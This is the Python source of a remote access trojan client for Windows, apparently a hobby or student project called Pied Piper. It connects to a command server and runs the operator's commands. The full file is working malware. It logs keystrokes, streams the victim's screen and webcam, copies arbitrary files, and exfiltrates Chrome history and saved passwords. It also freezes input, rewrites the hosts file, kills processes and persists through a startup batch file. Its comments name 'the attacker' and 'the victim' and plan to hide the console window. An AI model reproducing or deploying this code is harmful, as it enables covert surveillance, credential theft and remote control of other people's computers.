import ctypes
import datetime
import fnmatch
import socket
import sys
import threading
import time
from shutil import copyfile
from tkinter import messagebox
from tkinter.tix import Tk
import webbrowser
import winreg as reg
import cv2
import pythoncom
import rsa
import pickle
import sqlite3

import win32api
import win32con
import wmi
from Client import Client
from KeyLogger import KeyLogger
from ImageCapture import ImageCapture
from SymmetricEncryption import SymmetricEncryption
from urllib.parse import urlparse
import os
import getpass
from ChromeDataCollector import ChromeDataCollector
from win32com.shell import shell, shellcon

import string
from ctypes import windll

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    # for i in range(len(drives)):
    #     drives[i] += ':\\'

    return drives
"""
I have to find out how to run RAT as background process without being seen (for gamma)
And add it to start up

The solutioni have is to use extension pyw in order to run the file with pythonw which used for gui apps and therefore,
do not generate a console.
"""

class RatClient(Client):
    def __init__(self, server_ip, server_port):
        """
        This is the initiate function of a rat client object,
        initiate class values and important objects to the class use like wmi object and key logger.
        In addition, it starts the connection.
        :param server_ip: The Pied Piper main server ip
        :param server_port: The Pied Piper main server port
        """
        self.error_report = b'there was a problem opening relevent files. Those files were required in order to execute the operation successfully.\n Maybe try again later.'

        self.hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        if not os.path.exists(os.getcwd()+'\\hosts_copy_backup'):
            print("added")
            copyfile(self.hosts_path, os.getcwd()+'\\hosts_copy_backup')

        # the next line would have put the script in the startup folder and would run it on start up
        # but it might be done on the installation faze
        # self.add_to_startup()

        self.wmi_obj = wmi.WMI()
        self.server_ip = server_ip
        self.server_port = server_port
        self.piper_public_key = None
        super().__init__(server_ip, server_port, 'Rat')
        print("Initiated connection")
        host_name = socket.gethostname()
        print("host name: ", host_name)
        host_ip = socket.gethostbyname(host_name)
        print("host ip: ", host_ip)
        self.user_name = str(os.getlogin()) + ' - ' + str(host_name) + ' - ' + str(host_ip)
        print(self.user_name)

        self.InputTemperature = ctypes.windll.user32.BlockInput(False)  # release Input

        self.init_client()
        print(self.recv(1024, decrypt=False).decode())  # name request
        self.send(self.user_name.encode(), encrypt=False)
        print(self.recv(1024, decrypt=False).decode())  # wait for command
        self.symmetric_encryption = None

        self.key_logger = KeyLogger()
        key_logging_thread = threading.Thread(target=self.key_logger.run)
        key_logging_thread.start()

        self.init_connection()
        self.run()
        # need to wait till client comes somehow

    def init_connection(self):
        """
        This function is used to initiate the required connection values for safe and encrypted communication.
        transfers rsa keys, and generates symmetric encryption key.
        """
        print(pickle.dumps(self.rsa_public_key))
        self.send(pickle.dumps(self.rsa_public_key), encrypt=False)
        print("sent key")
        encrypted_key = self.recv(1024, decrypt=False)
        print(encrypted_key)
        print(self.rsa_private_key)
        decrypted_key = rsa.decrypt(encrypted_key, self.rsa_private_key)
        self.symmetric_encryption = SymmetricEncryption(decrypted_key)
        print("sent key")
        self.recv(1024) # Has Chrome Check

        chrome_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome'
        has_chrome = os.path.exists(chrome_path)
        self.send(str(has_chrome).encode())
        self.recv(1024) # got chrome state confirmation
        print("is admin ", str(self.is_admin()))
        self.send(str(self.is_admin()).encode())
        self.recv(1024)  # is admin state confirmation
        self.send('InitiationCompleted'.encode())

    def add_to_startup(self):
        """
        This function is used in order to add this script to the windows registry database as a start up script.
        """
        USER_NAME = getpass.getuser()
        file_path = os.path.dirname(os.path.realpath(__file__))
        s_name = "RatClient.pyw"

        # joins the file name to end of path address
        file_path = os.path.join(file_path, s_name)
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

        try:
            if not os.path.exists(bat_path + '\\' + "WindowsPiper.bat"):
                with open(bat_path + '\\' + "WindowsPiper.bat", "w+") as bat_file:
                    bat_file.write(r'"%s" "%s"' % (sys.executable, file_path))
            print("finished")
        except Exception as e:
            print(e)

    def add_block(self, domain, to):
        """
        changes the hosts file in order to block a url
        """
        # check if file exists
        try:
            with open(self.hosts_path, 'r') as f:
                current = f.read()
                if not '\n#PiedPiperEND' in current:
                    current += '\n#PiedPiperSTART\n#PiedPiperEND'

            if domain not in current:
                s = f'{to} {domain} #RAT\n{to} www.{domain} #RAT'

                with open(self.hosts_path, 'w+') as f:
                    current = current.replace('\n#PiedPiperEND', '\n' + s + '\n#PiedPiperEND')
                    f.write(current)
        except Exception as e:
            print(e)

    def remove_from_block(self, domain):
        """
        changes the hosts file in order to release a url
        """
        # check if file exists
        try:
            with open(self.hosts_path, 'r') as f:
                current_lines = f.readlines()

            with open(self.hosts_path, 'w') as f:
                for line in current_lines:
                    if not f'{domain} #RAT' in line:
                        f.write(line)
        except Exception as e:
            print(e)

    def release_block(self):
        """
        changes the hosts file in order to release all blocked urls
        """
        # check if file exists
        try:
            with open(self.hosts_path, 'r') as f:
                current = f.read()

            tmp = current
            tmp = tmp.split('#PiedPiperSTART')
            tmp[1] = tmp[1].split('#PiedPiperEND')
            current = current.replace(tmp[1][0][1:-1], '')
            print(tmp[1][0][1:-1])
            with open(self.hosts_path, 'w+') as f:
                f.write(current)
        except Exception as e:
            print(e)

    def run_new_goose(self):
        """
        runs the goose desktop program that generates goose on screen
        """
        try:
            os.startfile(os.getcwd() + "\\DesktopGoose\\GooseDesktop.exe")
        except:
            print("Could not find required software to run")

    def is_admin(self):
        """
        returns if this program has an admin permissions
        """
        try:
            return True if ctypes.windll.shell32.IsUserAnAdmin() == 1 else False
        except:
            return False

    # def traverse_dir(self, lst, path):
    #     try:
    #         for d in os.listdir(path):
    #             full_path = os.path.join(path, d)
    #             isdir = os.path.isdir(full_path)
    #             if isdir:
    #                 inside = []
    #                 self.traverse_dir(inside, full_path)
    #                 for i in inside:
    #                     lst.append(i)
    #             else:
    #                 lst.append(full_path)
    #     except:
    #         pass

    def send_file_in_bytes(self, file_in_bytes):
        """
        sends a file in sockets, the file is in bytes and encrypted, in order to do so it first sends the length of
        the data so the other side would know what to expect
        and how much times he need to read from the socket
        """
        self.send(str(len(self.symmetric_encryption.encrypt(file_in_bytes))).encode())
        self.recv(1024)
        print("recieved confirmation")
        try:
            self.my_socket.send(self.symmetric_encryption.encrypt(file_in_bytes))
        except Exception as e:
            self.sockets_error(str(e))
        print("sent file")

    def find_history_folder(self, pattern, path):
        """
        finds the path to the history folder and returns it, it runs on each subfolder, it does that to find
        the history folder, because each profile in chrome has a different name, so the folder name is not always the same
        returns:result
        """
        result = []
        for root, dirs, files in os.walk(path):
            for name in files:
                if fnmatch.fnmatch(name, pattern):
                    result.append(os.path.join(root, name))
        return result

    def warning_msg(self, string):
        """
        pops up a warning message using win api
        """
        win32api.MessageBox(0, string, "Be Warned!", win32con.MB_ICONWARNING)

    def run(self):
        """
        This function is the main operative function for the rat client. it starts the listening for commands
        and operates them.
        """

        while True:
            required_task = self.recv(1024, decrypt=False)  # Getting from client his required task
            if required_task == b'close':
                required_task = 'close_disconnect'
            else:
                try:
                    required_task = self.symmetric_encryption.decrypt(required_task).decode()
                    if required_task[0] != '$':
                        required_task = 'close_error'
                except:
                    required_task = 'close_error'

            print("The required task is: " + required_task)

            if required_task == "$ScreenStream":
                # a screen streaming task where the attacker can view the victim screen.

                # UDP

                # udp_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
                # streamer = ImageCapture(udp_socket, (self.server_ip, self.server_port), self)
                # streamer.run("screen")

                # TCP
                streamer = ImageCapture(self)
                streamer.run("screen")

            elif required_task == '$CopyFile':
                # a task that lets the attacker to copy any file from the victim's pc
                self.send('Confirmed'.encode())
                file = self.recv(1024).decode()
                try:
                    with open(file, 'rb') as f:
                        file_in_bytes = f.read()
                    self.send(str(len(self.symmetric_encryption.encrypt(file_in_bytes))).encode())
                    self.recv(1024)
                    print("recieved confirmation")
                    try:
                        self.my_socket.send(self.symmetric_encryption.encrypt(file_in_bytes))
                    except Exception as e:
                        self.sockets_error(str(e))
                    print("sent file")
                except Exception as e:
                    print(e)
                    file_in_bytes = self.error_report
                    self.send_file_in_bytes(file_in_bytes)

            elif required_task == '$RequestDrives': # such as hard drives
                # a task that sends the user the list of drivers that contains saved datas, like hard drives or ssd
                lst_in_bytes = pickle.dumps(get_drives())
                self.send(str(len(self.symmetric_encryption.encrypt(lst_in_bytes))).encode())
                self.recv(1024)
                print("recieved confirmation")
                try:
                    self.my_socket.send(self.symmetric_encryption.encrypt(lst_in_bytes))
                except Exception as e:
                    self.sockets_error(str(e))
                print("sent file")

            elif required_task == '$isFile':
                # a task that helps the attacker check if a path points to a file
                self.send('confirmation'.encode())
                path = self.recv(1024).decode()
                isfile = os.path.isfile(path)
                print(str(isfile))
                self.send(str(isfile).encode())

            elif required_task == '$ListDir':
                # a task that give the attacker the list of things a directory contains
                self.send('confirmation'.encode())
                path = self.recv(1024).decode()

                try:
                    list_dir_result = os.listdir(path)
                except PermissionError:
                    list_dir_result = []

                for name in list_dir_result:
                    if '.lnk' in name or '.url' in name:
                        print(name)
                        list_dir_result.remove(name)

                lst_in_bytes = pickle.dumps(list_dir_result)
                self.send(str(len(self.symmetric_encryption.encrypt(lst_in_bytes))).encode())
                self.recv(1024)
                print("recieved confirmation")
                try:
                    self.my_socket.send(self.symmetric_encryption.encrypt(lst_in_bytes))
                except Exception as e:
                    self.sockets_error(str(e))
                print("sent file")

            # elif required_task == '$RequestDirFiles':
            #     print("Requested")
            #     self.send('confirmation'.encode())
            #     path = self.recv(1024).decode()
            #
            #     if path == 'Documents':
            #         path = shell.SHGetFolderPath(0, shellcon.CSIDL_PERSONAL, None, 0)
            #     else:
            #         path = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, 0, 0)
            #
            #     lst = []
            #     self.traverse_dir(lst, path)
            #     print(lst)
            #     lst_in_bytes = pickle.dumps(lst)
            #     self.send(str(len(self.symmetric_encryption.encrypt(lst_in_bytes))).encode())
            #     self.recv(1024)
            #     print("recieved confirmation")
            #     try:
            #         self.my_socket.send(self.symmetric_encryption.encrypt(lst_in_bytes))
            #     except Exception as e:
            #         self.sockets_error(str(e))
            #     print("sent file")

            elif required_task == '$FreezeMouseAndKeyboard':
                # freezes the input from keyboard and mouse, except of ctrl+alt+del
                self.InputTemperature = ctypes.windll.user32.BlockInput(True)  # release Input
                self.send("Confirmed".encode())  # confirmation

            elif required_task == '$UnFreezeMouseAndKeyboard':
                # unfreezes the input from keyboard and mouse
                self.InputTemperature = ctypes.windll.user32.BlockInput(False)  # block input
                self.send("Confirmed".encode())  # confirmation

            elif required_task == '$blockSite':
                # a task that blocks the access to a site
                self.send("Confirmed".encode())  # confirmation
                domain = self.recv(1024).decode()
                self.add_block(domain, '127.0.0.1')


            elif required_task == '$releaseBlockedSite':
                # a task of popping up a requested url
                self.send("Confirmed".encode())  # confirmation
                domain = self.recv(1024).decode()
                self.remove_from_block(domain)

            elif required_task == '$releaseAllBlockedSites':
                # a task that release the block of a site
                self.send("Confirmed".encode())  # confirmation
                self.release_block()

            elif required_task == '$importKeyboardInput':
                # a request to get all the victim's keyboard input.
                file_in_bytes = b''
                try:
                    with open(self.key_logger.buffer_file_name, 'rb') as f:
                        file_in_bytes = f.read()
                    self.send_file_in_bytes(file_in_bytes)
                    # self.my_socket.recv(1024)
                except Exception as e:
                    file_in_bytes = self.error_report
                    self.send_file_in_bytes(file_in_bytes)


            # elif required_task == '$importNetworkActivity':
            #     try:
            #         file_in_bytes = b''
            #         with open(self.sniffer.buffer_file_name, 'rb') as f:
            #             file_in_bytes = f.read()
            #         self.send_file_in_bytes(file_in_bytes)
            #     except Exception as e:
            #         print(e)
            #         file_in_bytes = self.error_report
            #         self.send_file_in_bytes(file_in_bytes)

            elif required_task == '$importChromeHistory':
                # a request to collect all the history of a chrome browser
                current_user = os.getlogin()
                print(current_user)
                history_path = r"C:\Users" + '\\' + current_user + r"\AppData\Local\Google\Chrome\User Data"
                history_path = self.find_history_folder('History', history_path)[0]
                file_in_bytes = b''
                try:
                    with open(history_path, 'rb') as f:
                        file_in_bytes = f.read()

                    with open('History.sqlite', 'wb') as f:
                        f.write(file_in_bytes)
                    con = sqlite3.connect('History.sqlite')
                    c = con.cursor()
                    c.execute(
                        "select url, title, visit_count, last_visit_time from urls")  # Change this to your prefered query
                    results = c.fetchall()
                    string = ''
                    for r in results:
                        time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=r[3])
                        domain = '{uri.scheme}://{uri.netloc}/'.format(uri=urlparse(str(r[0])))
                        string += 'domain: ' + str(domain) + ' url: ' + str(r[0]) + ' description: ' + str(r[1]) + ' time: ' + str(time) + '\n'

                    self.send(str(len(self.symmetric_encryption.encrypt(string.encode()))).encode())
                    self.recv(1024)
                    print("recieved confirmation")
                    try:
                        self.my_socket.send(self.symmetric_encryption.encrypt(string.encode()))
                    except Exception as e:
                        self.sockets_error(str(e))
                    print("sent file")
                except:
                    file_in_bytes = self.error_report
                    self.send_file_in_bytes(file_in_bytes)

            elif required_task == '$ActiveProcesses':
                # a request to see all running proccesses in the victim's pc
                active_procs = ''
                # Iterating through all the running processes
                for process in self.wmi_obj.Win32_Process():
                    active_procs += str(process.name) + ', Process id: ' + str(process.ProcessId)
                    active_procs += ', exe-path: ' + str(
                        process.ExecutablePath) + '\n' if process.ExecutablePath is not None else '\n'

                self.send(str(len(self.symmetric_encryption.encrypt(active_procs.encode()))).encode())
                self.recv(1024)
                print("recieved confirmation")
                try:
                    self.my_socket.send(self.symmetric_encryption.encrypt(active_procs.encode()))
                except Exception as e:
                    self.sockets_error(str(e))

            elif required_task == '$LockScreen':
                # locks the user screen
                ctypes.windll.user32.LockWorkStation()
                self.send('done'.encode())

            elif required_task == '$KillProcByName':
                # terminate a process that runs by its name it get form the attacker
                self.send('ConfirmedTask'.encode())
                proc_name = self.recv(1024).decode()

                status = os.system("taskkill /im " + proc_name + ' /F')

                if status == 0:
                    msg = proc_name + ' was killed successfully'
                else:
                    msg = 'There was a problem killing the process.'
                self.send(msg.encode())

            elif required_task == '$DesktopGoose':
                # launches a desktop goose (a program that someone created that runs goose over the scree)
                t = threading.Thread(target=self.run_new_goose)
                t.start()
                self.send("Ran Goose".encode())

            # elif required_task == 'TransferFile':
            #     self.send('ConfirmedTask'.encode())
            #     file_name = self.recv(1024)
            #
            #     file_in_bytes = self.recv_large_data()
            #
            #     with open(file_name, 'wb') as f:
            #         f.write(file_in_bytes)
            #     # self.my_socket.recv(1024)

            elif required_task == "$OpenWebsite":
                # a task of popping up a requested url
                self.send("Confirmed".encode())  # confirmation
                url = self.recv(1024).decode()
                print(url)
                print("Opening " + url)

                # Windows
                windows_chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'

                if os.path.exists(windows_chrome_path[:-3]):
                    webbrowser.get(windows_chrome_path).open_new(url)
                else:
                    webbrowser.open_new(url)

            elif required_task == "$PopupMessage":
                # a task of popping up a message window.
                self.send("Confirmed".encode())  # confirmation
                string = self.recv(1024).decode()
                print(string)
                # starts a new thread so this client will be available to respond to new requests
                warning_message_thread = threading.Thread(target=self.warning_msg, args=[string])
                warning_message_thread.start()

            elif required_task == '$isCameraConnected':
                # checking if a camera is connected to the pc.
                cam = cv2.VideoCapture(0)
                if cam.isOpened():
                    self.send('opened'.encode())
                else:
                    self.send('closed'.encode())


            elif required_task == "$CameraStream":
                # a task of streaming camera to the attacker pc
                streamer = ImageCapture(self)
                streamer.run("camera")

            elif required_task == "$CollectChromeData":
                # a task that runs the chrome data collector that tries to get usernames and passwords saved by chrome
                # and send it to the attacker
                collector = ChromeDataCollector()
                data = collector.run()
                self.send(str(len(self.symmetric_encryption.encrypt(data.encode()))).encode())
                self.recv(1024)
                print("recieved confirmation")
                try:
                    self.my_socket.send(self.symmetric_encryption.encrypt(data.encode()))
                except Exception as e:
                    self.sockets_error(str(e))

            elif required_task == "close_disconnect":
                # a request to close the connection between the 2 peers and announce it to the main server.
                try:
                    self.my_socket.send(b'closing')
                except Exception as e:
                    self.sockets_error(str(e))
                # print(self.my_socket.recv(1024).decode()) # wait for command
                # init new one:
                ############
                self.init_connection()

            elif required_task == "close_error":
                # a request to close the connection between the 2 peers and announce it to the main server.
                try:
                    self.my_socket.send(b'closing')
                except Exception as e:
                    self.sockets_error(str(e))
                # print(self.my_socket.recv(1024).decode()) # wait for command
                # init new one:
                ############
                # self.init_connection
                self.my_socket.close()
                main()


def main():
    RatClient("127.0.0.1", 8200)
if __name__ == "__main__":
    main()